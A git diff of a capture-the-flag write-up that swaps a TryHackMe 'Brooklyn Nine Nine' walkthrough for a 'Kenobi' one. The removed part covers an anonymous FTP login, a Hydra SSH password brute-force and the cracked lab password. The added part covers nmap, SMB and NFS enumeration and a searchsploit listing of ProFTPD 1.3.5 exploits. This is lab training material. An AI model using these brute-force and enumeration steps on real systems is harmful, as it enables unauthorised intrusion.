@@ -10,7 +10,7 @@
 
 ### Task 1 - Deploy the machine
 
-🎯 Target IP: `10.10.218.233`
+🎯 Target IP: `10.10.51.196`
 
 Create a directory for machine on the Desktop and a directory containing the scans with nmap.
 
@@ -18,10 +18,10 @@ Create a directory for machine on the Desktop and a directory containing the sca
 
 ```bash
 su
-echo "10.10.218.233 brooklyn.thm" >> /etc/hosts
+echo "10.10.51.196 kenobi.thm" >> /etc/hosts
 
-mkdir thm/brooklyn.thm
-cd thm/brooklyn.thm
+mkdir thm/kenobi.thm
+cd thm/kenobi.thm
 
 # At the end of the room
 # To clean up the last line from the /etc/hosts file
@@ -31,153 +31,242 @@ sed -i '$ d' /etc/hosts
 I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.
 
 ```bash
-PING brooklyn.thm (10.10.218.233) 56(84) bytes of data.
-64 bytes from brooklyn.thm (10.10.218.233): icmp_seq=1 ttl=63 time=61.1 ms
-64 bytes from brooklyn.thm (10.10.218.233): icmp_seq=2 ttl=63 time=61.5 ms
-64 bytes from brooklyn.thm (10.10.218.233): icmp_seq=3 ttl=63 time=60.6 ms
+ping -c 3 kenobi.thm
+```
+
+```bash
+PING kenobi.thm (10.10.51.196) 56(84) bytes of data.
+64 bytes from kenobi.thm (10.10.51.196): icmp_seq=1 ttl=63 time=61.3 ms
+64 bytes from kenobi.thm (10.10.51.196): icmp_seq=2 ttl=63 time=78.2 ms
+64 bytes from kenobi.thm (10.10.51.196): icmp_seq=3 ttl=63 time=75.1 ms
 ```
 
 Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.
 
-#### Task 2 - Find the User flag
+2.1 - Scan the machine with nmap, how many ports are open?
 
 ```bash
-nmap --open brooklyn.thm
-```
-
-```bash
-Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 15:36 EDT
-Nmap scan report for brooklyn.thm (10.10.218.233)
-Host is up (0.068s latency).
-Not shown: 997 closed tcp ports (conn-refused)
-PORT   STATE SERVICE
-21/tcp open  ftp
-22/tcp open  ssh
-80/tcp open  http
+nmap --open kenobi.thm 
 ```
 
 ```bash
-nmap -p21,22,80 -sV -sC -n -Pn brooklyn.thm
-```
-
-```
-Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 16:08 EDT
-Nmap scan report for brooklyn.thm (10.10.218.233)
-Host is up (0.073s latency).
-Not shown: 997 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to ::ffff:10.9.80.228
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 2
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
-|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
-|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-title: Site doesn't have a title (text/html).
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-```
-
-
-
-After this, we try to access with ftp
-
-```bash
-ftp brooklyn.thm
-Connected to brooklyn.thm.
-220 (vsFTPd 3.0.3)
-Name (brooklyn.thm:kali): anonymous
-331 Please specify the password.
-Password: 
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-```
-
-We can use anonymous login (without psw)
-
-```bash
-ftp> ls
-229 Entering Extended Passive Mode (|||21186|)
-150 Here comes the directory listing.
--rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
-226 Directory send OK.
-ftp> get note_to_jake.txt
-local: note_to_jake.txt remote: note_to_jake.txt
-229 Entering Extended Passive Mode (|||16727|)
-150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
-100% |*************************************************************************************|   119       14.56 KiB/s    00:00 ETA
-226 Transfer complete.
-119 bytes received in 00:00 (1.67 KiB/s)
-```
-
-In the current directory there's a file: note\_to\_jake.txt, we get it to read it.
-
-```bash
-From Amy,
-
-Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
-```
-
-it's another great indication, we know that there's a user: Jake with a weak password.
-
-We use brute force tool: Hydra with parameters: Jake and dictionary (rockyou).
-
-```bash
-hydra -l jake -P /usr/share/wordlists/rockyou.txt brooklyn.thm ssh
-```
-
-```bash
-Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-24 05:56:00
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking ssh://brooklyn.thm:22/
-[22][ssh] host: brooklyn.thm   login: jake   password: 987654321
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-24 12:16 EDT
+Nmap scan report for kenobi.thm (10.10.51.196)
+Host is up (0.062s latency).
+Not shown: 993 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+2049/tcp open  nfs
 ```
 
 {% hint style="info" %}
-jake::987654321
+7 ports are open
 {% endhint %}
 
-We can use the credentials obtained for ssh access:
+#### Task 3 - Enumerating Samba for shares
+
+![](<.gitbook/assets/image (2).png>)
+
+Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.
+
+Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.
+
+![](<.gitbook/assets/image (5).png>)
+
+#### 3.1 - How many shares have been found?
 
 ```bash
-ssh jake@brooklyn.thm
-jake@brooklyn.thm's password: 
-Last login: Tue May 26 08:56:58 2020
+nmap -p139,445 -sCV -T4 -A kenobi.thm -oG smb_scan.txt
 ```
 
 ```bash
-jake@brookly_nine_nine:~$ pwd
-/home/jake
-jake@brookly_nine_nine:~$ whoami
-jake
-jake@brookly_nine_nine:~$ ls
-jake@brookly_nine_nine:~$ cd ..
-jake@brookly_nine_nine:/home$ ls
-amy  holt  jake
-jake@brookly_nine_nine:/home$ cd holt
-jake@brookly_nine_nine:/home/holt$ ls
-nano.save  user.txt
-jake@brookly_nine_nine:/home/holt$ cat user.txt
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-24 12:25 EDT
+Nmap scan report for kenobi.thm (10.10.51.196)
+Host is up (0.062s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.4
+OS details: Linux 5.4
+Network Distance: 2 hops
+Service Info: Host: KENOBI
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-06-24T16:25:19
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: kenobi
+|   NetBIOS computer name: KENOBI\x00
+|   Domain name: \x00
+|   FQDN: kenobi
+|_  System time: 2023-06-24T11:25:19-05:00
+|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
+
+TRACEROUTE (using port 139/tcp)
+HOP RTT      ADDRESS
+1   60.44 ms 10.9.0.1
+2   62.65 ms kenobi.thm (10.10.51.196)
+
 ```
+
+After scan of SMB ports, we need to find shares using nmap script:
+
+```bash
+nmap -p139,445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.51.196
+```
+
+```bash
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.51.196\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.51.196\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\home\kenobi\share
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.51.196\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|_    Current user access: <none>
+```
+
+{% hint style="info" %}
+3 shares
+{% endhint %}
+
+On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.
+
+#### 3.2 - Once you're connected, list the files on the share. What is the file can you see?
+
+```bash
+smbclient //kenobi.thm/anonymous
+```
+
+```bash
+Password for [WORKGROUP\root]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Sep  4 06:49:09 2019
+  ..                                  D        0  Wed Sep  4 06:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
+
+                9204224 blocks of size 1024. 6877092 blocks available
+smb: \> get log.txt
+getting file \log.txt of size 12237 as log.txt (46.1 KiloBytes/sec) (average 46.1 KiloBytes/sec)
+smb: \> exit
+cat log.txt
+```
+
+#### 3.3 - What port is FTP running on?
+
+{% hint style="info" %}
+21
+{% endhint %}
+
+#### 3.4 - What mount can we see?
+
+Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.
+
+```bash
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount kenobi.thm
+```
+
+{% hint style="info" %}
+/var
+{% endhint %}
+
+### Task 4 - Gain initial access with ProFtpd
+
+![](.gitbook/assets/image.png)\
+ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.
+
+#### 4.1 - Lets get the version of ProFtpd.
+
+```bash
+nmap -p21 -sCV kenobi.thm
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-24 12:53 EDT
+Nmap scan report for kenobi.thm (10.10.51.196)
+Host is up (0.063s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5
+Service Info: OS: Unix
+```
+
+{% hint style="info" %}
+1.3.5
+{% endhint %}
+
+We can use searchsploit to find exploits for a particular software version.
+
+Searchsploit is basically just a command line search tool for exploit-db.com.
+
+#### 4.2 - How many exploits are there for the ProFTPd running?
+
+```bash
+// Some codeearchsploit proftpd 1.3.5            
+------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                  |  Path
+------------------------------------------------------------------------------------------------ ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                       | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                             | linux/remote/36803.py
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                         | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                                                       | linux/remote/36742.txt
+------------------------------------------------------------------------------------------------ ---------------------------------
+```
+
+{% hint style="info" %}
+4
+{% endhint %}
+
+
+
+
+
+
+
+
+
+
 
 <details>
 
